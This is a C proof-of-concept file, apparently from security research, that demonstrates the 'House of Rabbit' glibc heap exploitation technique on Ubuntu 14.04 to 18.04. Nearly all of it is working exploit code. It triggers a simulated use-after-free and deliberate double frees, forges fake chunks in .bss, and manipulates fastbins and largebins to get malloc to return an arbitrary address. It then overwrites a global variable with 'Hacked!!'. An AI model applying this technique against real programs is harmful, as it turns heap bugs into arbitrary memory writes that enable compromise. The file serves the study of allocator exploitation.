/*
   PoC of House of Rabbit
   Tested in Ubuntu 14.04, 16.04 (64bit).
   
   Yutaro Shimizu
   @shift_crops
   2017/09/14

   Update (2019/08/06) : Ubuntu 18.04 (glibc-2.27)
*/

// gcc house_of_rabbit.c -D GLIBC_VERSION=27 -o house_of_rabbit

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void evict_tcache(size_t size);

char target[0x30] = "Hello, World!";
unsigned long gbuf[8] = {0};

int main(void){
	void *p, *fast, *small, *fake;
	char *victim;

	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf(	"This is PoC of House of Rabbit\n"
		"This technique bypassing Heap ASLR without leaking address, "
		"and make it possible to overwrite a variable located at an arbitary address.\n"
		"Jump like a rabbit and get an accurate address by malloc! :)\n\n");

	// 0. Disable tcache for 0x20,0x90 chunks
	printf("0. Disable tcache for 0x20,0x90 chunks (for glibc version >= 2.26)\n\n");
	evict_tcache(0x18);
	evict_tcache(0x88);


	// 1. Make 'av->system_mem > 0xa00000'
	printf("1. Make 'av->system_mem > 0xa00000'\n");
	p = malloc(0xa00000);
	printf("  Allocate 0xa00000 byte by mmap at %p, and free.\n", p);
	free(p);

	p = malloc(0xa00000);
	printf("  Allocate 0xa00000 byte in heap at %p, and free.\n", p);
	free(p);
	printf("  Then, the value of 'av->system_mem' became larger than 0xa00000.\n\n");


	// 2. Free fast chunk and link to fastbins
	printf("2. Free fast chunk and link to fastbins\n");
	fast = malloc(0x18);
	small = malloc(0x88);
	printf(	"  Allocate fast chunk and small chunk.\n"
		"  fast = %p\n"
		"  small = %p\n", fast, small);
	free(fast);
	printf("  Free fast chunk.\n\n");

	
	// 3. Make fake_chunk on .bss
	printf("3. Make fake_chunk on .bss\n");
	gbuf[0] = 0xfffffffffffffff0;
	gbuf[1] = 0x10;
	gbuf[3] = 0x21;
	gbuf[7] = 0x1;
	printf(	"  fake_chunk1 (size : 0x%lx) is at %p\n"
		"  fake_chunk2 (size : 0x%lx) is at %p\n\n"
		, gbuf[3], &gbuf[2], gbuf[1], &gbuf[0]);


	// VULNERABILITY
	// use after free or fastbins dup etc...
	fake = &gbuf[2];
	printf(	"VULNERABILITY (e.g. UAF)\n"
		"  *fast = %p\n"
		, fake);
	*(unsigned long**)fast = fake;
	printf("  fastbins list : [%p, %p, %p]\n\n", fast-0x10, fake, *(void **)(fake+0x10));


	// 4. call malloc_consolidate
	printf(	"4. call malloc_consolidate\n"
		"  Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n"
		, small, fake);
	free(small);


	// 5. Link unsorted bins to appropriate list
	printf(	"5. Link unsorted bins to appropriate list\n"
		"  Rewrite fake_chunk1's size to 0xa0001 to bypass 'size < av->system_mem' check.\n");
	gbuf[3] = 0xa00001;
	malloc(0xa00000);
	printf(	"  Allocate huge chunk.\n"
		"  Now, fake_chunk1 link to largebin[126](max).\n"
		"  Then, write fake_chunk1's size back to 0xfffffffffffffff1.\n\n");
	gbuf[3] = 0xfffffffffffffff1;	


	// 6. Overwrite targer variable
	printf(	"6. Overwrite targer variable on .data\n"
		"  target is at %p\n"
		"  Before : %s\n"
		, &target, target);

	malloc((void*)&target-(void*)(gbuf+2)-0x20);
	victim = malloc(0x10);
	printf("  Allocate 0x10 byte at %p, and overwrite.\n", victim);
	strcpy(victim, "Hacked!!");

	printf("  After  : %s\n", target);
}

void evict_tcache(size_t size){
	void *p;

#if defined(GLIBC_VERSION) && (GLIBC_VERSION >= 26)
	p = malloc(size);

#if	(GLIBC_VERSION < 29)
	free(p);
	free(p);
	malloc(size);
	malloc(size);

	*(void**)p = NULL;

	malloc(size);
#else

#if (GLIBC_VERSION == 29)
	char *counts 		= (char*)(((unsigned long)p & ~0xfff) + 0x10);
#else
	uint16_t *counts 	= (char*)(((unsigned long)p & ~0xfff) + 0x10);
#endif
	counts[(size + 0x10 >> 4) - 2] = 0xff;

#endif
#endif
}
